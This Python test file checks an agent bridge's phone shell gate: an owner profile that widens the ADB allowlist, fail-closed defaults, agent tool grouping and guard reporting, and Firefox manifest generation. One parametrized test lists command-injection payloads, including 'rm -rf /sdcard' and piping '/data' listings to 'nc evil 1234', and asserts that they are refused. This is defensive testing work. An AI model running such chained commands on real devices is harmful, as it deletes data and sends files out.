"""Four things the operator asked for, each pinned by what it must do.

His five answers, condensed:

1. Fix everything, not in priority order.
2. The phone must be as capable as the desktop, and Firefox must work.
3. He builds this for everyone, not for his own device.
4. *"A lock where it is not needed"* -- the ADB allowlist ignored the
   profile, so a bridge deliberately set to `owner-shell` still refused
   `am start` on a phone its owner controls.
5. Agents should be handed their toolset at the start, grouped, rather
   than having to know to ask.

Point 4 is the one with teeth: a guard the owner cannot reach after
unlocking everything else is not safety, it is a defect wearing safety's
clothes, and it teaches people to distrust the parts that do matter.
"""
from __future__ import annotations

import json
import pathlib

import pytest

from arena import runtime_profile as rp, self_description as sd
from arena.mobile import shell

ROOT = pathlib.Path(__file__).resolve().parents[1]


@pytest.fixture(autouse=True)
def clean_profile():
    rp.reset_for_tests()
    yield
    rp.reset_for_tests()


# ------------------------------------------------ #4: the lock follows the key

def test_owner_shell_unlocks_the_phone_allowlist():
    """The defect: the allowlist never read the profile.

    `am start` is the plainest example -- launching an app is the single
    most obvious thing to ask a phone to do, and it was refused on a
    machine whose owner had already enabled full shell on the desktop.
    """
    rp.publish({"profile": "owner-shell"})
    result = shell.restricted_shell("SERIAL", "am start -n com.x/.Main")
    # adb is absent in CI, so the allowlist verdict is what we assert:
    # anything except an allowlist refusal means the gate opened.
    assert "not on the allowlist" not in (result.get("error") or ""), (
        "owner-shell still hit the read-only allowlist")


def test_cautious_still_refuses_the_same_command():
    rp.publish({"profile": "cautious"})
    result = shell.restricted_shell("SERIAL", "am start -n com.x/.Main")
    assert "not on the allowlist" in (result.get("error") or "")


def test_the_profile_is_read_live_not_cached():
    """The Dashboard mutates cfg in place; a snapshot would lie.

    This is the shape of the original bug moved one layer down, so it
    gets its own test rather than being assumed.
    """
    cfg = {"profile": "cautious"}
    rp.publish(cfg)
    assert shell._profile() == "cautious"
    cfg["profile"] = "owner-shell"
    assert shell._profile() == "owner-shell", (
        "profile was cached; the Dashboard switch would not reach the phone")


def test_an_unpublished_config_fails_closed():
    """No config must mean locked, never unlocked.

    An import-ordering change that left the config unpublished would
    otherwise silently open every phone.
    """
    rp.reset_for_tests()
    assert shell._profile() == "cautious"
    assert rp.current_profile() == "cautious"


@pytest.mark.parametrize("profile", ["cautious", "owner-shell"])
@pytest.mark.parametrize("payload", [
    "ls /sdcard & touch /tmp/PWNED",
    "getprop; rm -rf /sdcard",
    "ls /data | nc evil 1234",
    "cat /x `whoami`",
])
def test_command_chaining_is_refused_in_both_profiles(profile, payload):
    """Unlocking is not the same as removing the RCE fix.

    Bug #40 was live: `adb shell` joins its argv and hands the string to
    the device's `/system/bin/sh`. `owner-shell` means "any single
    command", not "any shell script" -- an operator who wants a pipeline
    asks for `sh -c` and sees exactly what they are running.
    """
    rp.publish({"profile": profile})
    result = shell.restricted_shell("SERIAL", payload)
    assert result.get("ok") is False
    assert "metacharacter" in (result.get("error") or "")


# ------------------------------------------- #5: the bridge describes itself

def _fake_tools():
    names = [
        "exec.exec", "exec.ping", "fs.read", "fs.write",
        "mobile.tap", "mobile.type", "mobile.screenshot",
        "mission.create", "relay.send", "code_project.open",
        "code_session.start", "git.status", "brandnew.thing",
    ]
    return [{"name": n, "description": f"does {n}", "inputSchema": {}} for n in names]


def test_tools_are_grouped_into_navigable_families():
    """240 flat entries is the wall; 45 prefixes is the same wall.

    `code_project`, `code_session`, `code_run` and `code_artifact` are
    four namespaces to the code and one subject to a reader.
    """
    groups = sd.categories(_fake_tools())
    by_id = {g["id"]: g for g in groups}

    assert "code" in by_id, "code_* prefixes did not fold into one family"
    assert set(by_id["code"]["tools"]) >= {
        "code_project.open", "code_session.start", "git.status"}
    assert by_id["phone"]["count"] == 3

    # Biggest first: a skimming agent should meet the rich surfaces
    # before the one-tool corners.
    counts = [g["count"] for g in groups]
    assert counts == sorted(counts, reverse=True)


def test_an_unknown_namespace_is_visible_not_swallowed():
    """A new tool group must show up as itself and be noticed.

    An "Other" bucket is how a tool becomes invisible; the next person
    to add a namespace would never learn it was uncategorised.
    """
    groups = sd.categories(_fake_tools())
    assert any(g["id"] == "brandnew" for g in groups)


def test_every_guard_reports_state_and_how_to_change_it():
    """A refusal without a reason reads as a broken tool.

    An agent that hits a wall should be able to tell the operator which
    switch to flip, rather than retrying at random.
    """
    entries = sd.guards(profile="cautious", yolo=False, halted=False,
                        posture={"runtime": "allowlist"})
    ids = {g["id"] for g in entries}
    assert ids == {"halt", "profile", "yolo", "posture"}
    for guard in entries:
        assert guard.get("blocks"), f"{guard['id']} does not say what it blocks"
        assert guard.get("turn_off"), f"{guard['id']} does not say how to change it"


def test_halt_is_reported_separately_from_the_other_guards():
    """HALT must never be foldable into a single "disable everything".

    The operator asked for one master switch. The reason he cannot have
    one that includes HALT: it is the last resort, and a control that
    the same gesture disables is not a last resort.
    """
    entries = {g["id"]: g for g in
               sd.guards(profile="owner-shell", yolo=True, halted=True)}
    assert entries["halt"]["blocking"] is True, (
        "HALT stopped blocking once the other guards were opened")
    assert entries["profile"]["blocking"] is False
    assert entries["yolo"]["blocking"] is False


def test_the_hint_names_what_is_blocking_and_where_to_change_it():
    described = sd.describe(
        tools=_fake_tools(), host={"class": "android", "role": "on-device"},
        profile="cautious", yolo=False, halted=False, version="test")
    hint = described["hint"]
    assert "Android phone" in hint
    assert "13 tools" in hint
    assert "Exec profile" in hint, "the hint does not name the active block"
    assert "Dashboard" in hint, "the hint does not say where to change it"
    assert "profile" in described["blocked_by"]


def test_nothing_blocking_says_so_plainly():
    described = sd.describe(
        tools=_fake_tools(), host={"class": "linux"},
        profile="owner-shell", yolo=True, halted=False, posture=None)
    assert described["blocked_by"] == []
    assert "No guards" in described["hint"]


def test_the_self_endpoint_is_registered():
    text = (ROOT / "arena" / "route_registry" / "registry.py").read_text(
        encoding="utf-8")
    assert "handle_v1_self" in text
    assert "'/v1/self'" in text


# --------------------------------------------------- #2: Firefox is supported

def test_a_firefox_build_can_be_generated():
    """Chromium-only manifest keys made Firefox reject the extension.

    Generated rather than hand-maintained: two manifests diverge the
    first time somebody edits one of them.
    """
    import importlib.util

    script = ROOT / "scripts" / "build_firefox_extension.py"
    assert script.is_file()

    spec = importlib.util.spec_from_file_location("build_ff", script)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)

    source = json.loads(
        (ROOT / "chat_extension" / "manifest.json").read_text(encoding="utf-8"))
    generated = module.build_manifest(source)

    assert module.verify(generated) == [], "generated manifest still invalid"
    assert generated["background"].get("scripts"), "no background scripts"
    assert "service_worker" not in generated["background"]
    assert "sidePanel" not in generated["permissions"]
    assert generated["browser_specific_settings"]["gecko"]["id"]
    assert generated["sidebar_action"]["default_panel"]

    # The parts that are identical must stay identical.
    assert generated["content_scripts"] == source["content_scripts"]
    assert generated["host_permissions"] == source["host_permissions"]


def test_the_chromium_manifest_is_still_chromium():
    """Reverse: generating a Firefox build must not mutate the source."""
    source = json.loads(
        (ROOT / "chat_extension" / "manifest.json").read_text(encoding="utf-8"))
    assert source["background"].get("service_worker"), (
        "the Chromium manifest lost its service worker")
    assert "sidePanel" in source["permissions"]
